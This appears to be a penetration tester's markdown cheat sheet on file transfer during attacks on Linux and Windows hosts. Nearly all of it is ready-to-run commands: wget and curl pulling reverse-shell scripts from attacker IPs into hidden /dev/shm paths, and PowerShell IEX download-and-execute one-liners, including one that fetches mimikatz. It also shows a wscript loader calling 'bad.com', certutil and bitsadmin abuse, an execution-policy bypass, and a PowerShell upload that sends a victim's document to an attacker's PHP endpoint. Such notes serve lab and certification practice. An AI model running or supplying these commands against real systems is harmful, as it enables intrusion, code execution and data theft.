# ⭕ HTTP

#### Linux

```
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

#### Windows

```
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

## <mark style="color:red;">Linux HTTP Server</mark>

```
python -m SimpleHTTPServer 80
python3 -m http.server 80
php -S 0.0.0.0:8000
ruby -run -e httpd . -p 9000
nc -kl 8000 --sh-exec "echo -e 'HTTP/1.1 200 OK\r\n'; date"
```

## <mark style="color:red;">Python HTTPS Server</mark>

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

## <mark style="color:red;">HTTP/FTP wget from linux</mark>

```
wget http://ip-addr[:port]/file[-o output-file]
```

#### A lesser known usage of wget is its ability to download FTP files as well. To do that, simply prepend a ftp:// before the URL. If the FTP server needs credentials, specify them with --ftp-user=username and --ftp-password=pass.

## <mark style="color:red;">Download with Visual basic</mark>

```
Set args = Wscript.Arguments Url = "http://domain/file" dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") dim bStrm: Set bStrm = createobject("Adodb.Stream") xHttp.Open "GET", Url, False xHttp.Send with bStrm     .type = 1 '     .open     .write xHttp.responseBody     .savetofile " C:%homepath%file", 2 ' end with

# run with:
cscript wget.vba
```

## <mark style="color:red;">Jscript Download</mark>

```
echo GetObject("script:https://bad.com/code.js") > code.js && wscript.exe code.js


# jscript source:

<?xml version="1.0"?>
<package>
<component id="PopCalc">
<script language="JScript">
    <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc"); 
    ]]>
</script>
</component>
</package>

```

## <mark style="color:red;">HTTP powershell Download</mark>

#### oneliner command:

```
powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')
```

#### powershell script:

```
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

#### to run the script:

```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

#### download and execute a PowerShell script without saving it to disk ( only for powershell scripts)

```
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
```

or

```
(new-object System.Net.Webclient).DownloadString('http://192.168.50.34:8080/mimikatz.ps1') | IEX
```

## <mark style="color:red;">http VBscript from windows</mark>

#### run these commands in order to create a vbscrtipt for downloading a file

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
echo Err.Clear >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
echo http.Open "GET", strURL, False >> wget.vbs 
echo http.Send >> wget.vbs 
echo varByteArray = http.ResponseBody >> wget.vbs 
echo Set http = Nothing >> wget.vbs 
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
echo strData = "" >> wget.vbs 
echo strBuffer = "" >> wget.vbs 
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
echo Next >> wget.vbs 
echo ts.Close >> wget.vbs
```

#### To run our wget.vbs script

```
cscript wget.vbs http://ip-addr:port/file output-file
```

## <mark style="color:red;">Windows Uploads Using Windows Scripting Languages</mark>

#### since standard TFTP, FTP, and HTTP servers are rarely enabled on Windows by default if outbound HTTP traffic is allowed, we can use the System.Net.WebClient PowerShell class to upload data to our Kali machine through an HTTP POST request create the following PHP script and save it as upload.php in our Kali webroot directory, /var/www/html:will process an incoming file upload request and save the transferred data to the /var/www/uploads/ directory.

```
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

```
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads
```

#### in windows:

```
C:\Users> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```

## <mark style="color:red;">Upload Files</mark>

#### python script

[https://gist.github.com/UniIsland/3346170](https://gist.github.com/UniIsland/3346170)
